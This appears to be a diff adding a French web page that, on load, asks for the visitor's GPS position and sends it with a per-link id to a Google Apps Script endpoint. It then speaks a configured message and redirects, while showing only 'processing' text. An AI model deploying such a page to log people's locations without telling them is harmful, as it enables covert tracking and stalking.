@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <title>GPS + Audio + Redirection</title>
+</head>
+<body>
+  <h2>Traitement en cours...</h2>
+  <script>
+    // ID unique depuis l'URL (ex: ?id=MONCODE123)
+    const urlParams = new URLSearchParams(window.location.search);
+    const id = urlParams.get('id');
+
+    // Feuille Google contenant les paramètres
+    const paramSheetURL = "https://opensheet.elk.sh/GOOGLE_SHEET_ID/PARAMETRE";
+
+    // Script Web App d'envoi des données
+    const submitURL = "https://script.google.com/macros/s/TON_SCRIPT_ID/exec";
+
+    async function main() {
+      try {
+        // Récupération des paramètres depuis Google Sheet
+        const response = await fetch(paramSheetURL);
+        const data = await response.json();
+        const redirectURL = data[0]["D5"];
+        const messageAudio = data[0]["D6"];
+
+        // Demande de position GPS
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // Envoi des données à Google Sheets
+            fetch(`${submitURL}?id=${id}&lat=${lat}&lon=${lon}`);
+
+            // Lecture du message vocal
+            const synth = window.speechSynthesis;
+            const utterance = new SpeechSynthesisUtterance(messageAudio);
+            synth.speak(utterance);
+
+            // Redirection après la fin du message
+            utterance.onend = () => {
+              window.location.href = redirectURL;
+            };
+          },
+          (error) => {
+            alert("Échec de la géolocalisation : " + error.message);
+          }
+        );
+      } catch (err) {
+        alert("Erreur : " + err);
+      }
+    }
+
+    main();
+  </script>
+</body>
+</html>
